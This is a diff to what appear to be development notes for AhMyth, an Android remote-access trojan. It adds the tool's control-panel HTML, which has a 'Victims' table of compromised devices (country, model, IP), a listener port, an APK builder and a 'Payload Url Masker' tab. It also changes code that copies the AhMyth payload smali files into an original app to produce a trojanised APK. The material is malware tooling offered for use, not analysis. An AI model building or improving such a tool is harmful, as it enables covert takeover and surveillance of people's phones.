@@ -1,3 +1,140 @@
+## Updated `index.html` file with correct log screen height
+```html
+<!DOCTYPE html>
+<html ng-app="myapp">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no" />
+
+    <title>AhMyth</title>
+
+    <!-- Insert this line above script imports  -->
+    <script>
+        if (typeof module === 'object') {
+            window.module = module;
+            module = undefined;
+        }
+    </script>
+
+
+    <script type="text/javascript" src="assets/js/lib/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
+    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
+    <script type="text/javascript" src="assets/js/controllers/AppCtrl.js"></script>
+    <!-- Insert this line after script imports -->
+    <script>
+        if (window.module) module = window.module;
+    </script>
+
+    <link rel="stylesheet" href="assets/css/mystyle.css">
+    <link rel="stylesheet" href="../node_modules/fomantic-ui/dist/semantic.min.css" />
+    <style>
+        #log {
+            height: 190px; /* Adjust the height value as per your preference */
+            overflow: scroll;
+        }
+    </style>
+
+</head>
+
+<body ng-controller="AppCtrl" class="draggable">
+
+    <div class="ui top attached tabular menu">
+        <a class="item active notDraggable" data-tab="first"><i class="large eye icon"></i>Victims</a>
+        <a class="item notDraggable" data-tab="second"><i class="large green android icon"></i>APK Builder</a>
+        <a class="item notDraggable" data-tab="third"><i class="large blue cloud icon"></i>Payload Url Masker</a>
+        <div class="ui right mini text menu notDraggable">
+            <button class=" ui circular orange button" ng-click="minimize()" style="font-size: 6px;height: 17px"></button>
+            <button class="ui circular green button" ng-click="maximize()" style="font-size: 6px;height: 17px"></button>
+            <button class="ui circular red button" ng-click="close()" style="font-size: 6px;height: 17px"></button>
+        </div>
+    </div>
+
+    <div class="ui bottom attached tab segment active h60 notDraggable" data-tab="first">
+        <div class="ui grid h100">
+            <div class="row h30">
+                <div class="column">
+                    <div class="ui horizontal segments">
+                        <div class="ui segment">
+                            <h2 class="ui left floated header">
+                                <img class="ui image" src="assets/img/VictimsLab.png">
+                                <div class="content">
+                                    VICTIMS LAB
+                                </div>
+                            </h2>
+                        </div>
+                        <div class="ui center aligned segment">
+                            <div style="line-height: 70px">
+                                <div class="ui right floated labeled input">
+                                    <div class="ui label">
+                                        Port
+                                    </div>
+                                    <input type="text" ng-model="port" placeholder="Default is 42474">
+                                </div>
+                                <button ng-click="isListen=true;Listen(port);" class="ui labeled icon black button"><i class="terminal icon"></i>Listen</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="row h75" style="overflow: scroll;">
+                <div class="column">
+                    <table class="ui table single line selectable">
+                        <thead>
+                            <tr>
+                                <th></th>
+                                <th>Country</th>
+                                <th>Manuf.</th>
+                                <th>Model</th>
+                                <th>Release</th>
+                                <th>IP</th>
+                                <th>Port</th>
+                                <th></th>
+                            </tr>
+                        </thead>
+
+                        <tbody>
+
+                            <tr ng-repeat="(key, victim) in victims">
+                                <td><a class="ui black ribbon label" ng-click="openLab(key)">Open The Lab</a></td>
+                                <td ng-if="victim.country != null"><i class="{{victim.country}} flag"></i></td>
+                                <td ng-if="victim.country == null"><i class="help circle icon"></i></td>
+                                <td ng-bind="victim.manf"></td>
+                                <td ng-bind="victim.model"></td>
+                                <td ng-bind="victim.release"></td>
+                                <td ng-bind="victim.ip"></td>
+                                <td ng-bind="victim.port"></td>
+                                <td></td>
+                            </tr>
+
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="ui bottom attached tab segment h60 notDraggable" data-tab="second">
+        <div ng-include="'views/build.html'" class="full"></div>
+    </div>
+
+    <div class="ui bottom attached tab segment h60 notDraggable" data-tab="third">
+        <div ng-include="'views/unavailable.html'" class="full"></div>
+    </div>
+
+    <div class="ui bottom attached black message notDraggable" id="log">
+        <div ng-repeat="log in logs" class="log">
+            <div class="w30" style="display: inline-block" ng-bind="log.date"></div>
+            <div class="w65" style="display: inline-block" ng-style="{'color':log.color}" ng-bind="log.msg"></div>
+        </div>
+    </div>
+
+</body>
+
+</html>
+```
 ## Updated 'Constants.js' File
 ```js
 var path = require("path");
@@ -116,15 +253,14 @@ $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
                     delayedLog('[x] Unable to Create the Smali Payload Directory!', CONSTANTS.logStatus.FAIL);
                     return;
                 };
+                
+                delayedLog('[★] Copying AhMyth Payload Files to Original App...');
 
                 fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
                     dir.join(apkFolder, "smali_classes2"), (error) => {
                         if (error) {
                             delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
-
-                            fs.mkdir(logPath);
-                            fs.writeFile(dir.join(logPath, 'Copying.log'),
-                                `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
+                            WriteErrorLog(error, 'Copying.log');
                             delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                             delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                             return;
@@ -165,10 +301,7 @@ $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
                     dir.join(apkFolder, payloadSmaliFolder), (error) => {
                         if (error) {
                             delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
-
-                            fs.mkdir(logPath);
-                            fs.writeFile(dir.join(logPath, 'Copying.log'),
-                                `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
+                            WriteErrorLog(error, 'Copying.log');
                             delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                             delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                             return;
